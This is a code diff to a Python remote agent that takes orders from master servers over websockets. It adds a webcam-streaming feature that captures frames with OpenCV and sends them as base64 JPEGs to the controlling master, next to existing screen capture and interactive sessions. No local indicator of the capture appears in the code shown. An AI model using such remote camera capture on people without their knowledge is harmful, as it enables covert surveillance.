@@ -577,6 +577,7 @@ def _derive_identity_sync() -> tuple[str, str]:
 # Track interactive sessions per master connection
 interactive_sessions: dict[Any, dict] = {}
 screen_sessions: dict[Any, dict] = {}
+camera_sessions: dict[Any, dict] = {}
 
 async def _connect_one_master(url: str):
     last_log = 0.0
@@ -664,6 +665,88 @@ await ws.send(json.dumps({"agent_id": agent_id, "agent_name": agent_name, "http_
                                 pass
                             continue
                         # Interactive session control
+                        # Camera start
+                        if isinstance(data, dict) and data.get("type") == "camera_start":
+                            if not CAMERA_ENABLED:
+                                try:
+                                    await ws.send(json.dumps({"error": "[Camera] Disabled on agent (CAMERA_ENABLED=0)\n"}))
+                                except Exception:
+                                    pass
+                                continue
+                            if ws in camera_sessions and camera_sessions[ws].get("running"):
+                                try:
+                                    await ws.send(json.dumps({"output": "[Camera already running]\n"}))
+                                except Exception:
+                                    pass
+                                continue
+                            fps = max(1, min(15, int(data.get("fps") or 8)))
+                            quality = min(95, max(10, int(data.get("quality") or 60)))
+                            async def _cam_loop():
+                                cap = None
+                                try:
+                                    try:
+                                        import cv2  # type: ignore
+                                    except Exception as e:
+                                        try:
+                                            await ws.send(json.dumps({"error": f"[Camera] missing deps: {e}\n"}))
+                                        except Exception:
+                                            pass
+                                        return
+                                    cap = await asyncio.to_thread(lambda: __import__('cv2').VideoCapture(0))
+                                    if not cap or not await asyncio.to_thread(cap.isOpened):
+                                        try:
+                                            await ws.send(json.dumps({"error": "[Camera] Cannot open camera\n"}))
+                                        except Exception:
+                                            pass
+                                        return
+                                    interval = 1.0 / float(fps)
+                                    while camera_sessions.get(ws, {}).get("running"):
+                                        t0 = time.time()
+                                        # Read frame
+                                        ok, frame = await asyncio.to_thread(cap.read)
+                                        if not ok:
+                                            await asyncio.sleep(0.1)
+                                            continue
+                                        # Encode JPEG
+                                        def _encode(f):
+                                            import cv2
+                                            import numpy as _np  # noqa
+                                            params = [int(cv2.IMWRITE_JPEG_QUALITY), int(quality)]
+                                            ok2, buf = cv2.imencode('.jpg', f, params)
+                                            return ok2, buf
+                                        ok2, buf = await asyncio.to_thread(_encode, frame)
+                                        if not ok2:
+                                            await asyncio.sleep(0.05)
+                                            continue
+                                        b64 = base64.b64encode(buf.tobytes()).decode()
+                                        h, w = frame.shape[:2]
+                                        payload = {"type": "camera_frame", "w": int(w), "h": int(h), "ts": int(t0*1000), "data": f"data:image/jpeg;base64,{b64}"}
+                                        try:
+                                            await ws.send(json.dumps(payload))
+                                        except Exception:
+                                            break
+                                        dt = time.time() - t0
+                                        await asyncio.sleep(max(0.0, interval - dt))
+                                except Exception:
+                                    pass
+                                finally:
+                                    try:
+                                        if cap is not None:
+                                            await asyncio.to_thread(cap.release)
+                                    except Exception:
+                                        pass
+                            camera_sessions[ws] = {"running": True, "task": asyncio.create_task(_cam_loop())}
+                            continue
+                        if isinstance(data, dict) and data.get("type") == "camera_stop":
+                            sessc = camera_sessions.pop(ws, None)
+                            if sessc:
+                                sessc["running"] = False
+                                try:
+                                    t = sessc.get("task")
+                                    if t: t.cancel()
+                                except Exception:
+                                    pass
+                            continue
                         if isinstance(data, dict) and data.get("type") == "screen_start":
                             # Start screen capture session (view-only)
                             if ws in screen_sessions:
@@ -962,6 +1045,15 @@ await ws.send(json.dumps({"agent_id": agent_id, "agent_name": agent_name, "http_
                 finally:
                     # Clean up any queued commands for this master on disconnect
                     await _remove_queued_for_ws(ws)
+                    # Kill any camera session tied to this ws
+                    c_sess = camera_sessions.pop(ws, None)
+                    if c_sess:
+                        try:
+                            c_sess["running"] = False
+                            t = c_sess.get("task")
+                            if t: t.cancel()
+                        except Exception:
+                            pass
                     # Kill any screen session tied to this ws
                     s_sess = screen_sessions.pop(ws, None)
                     if s_sess:
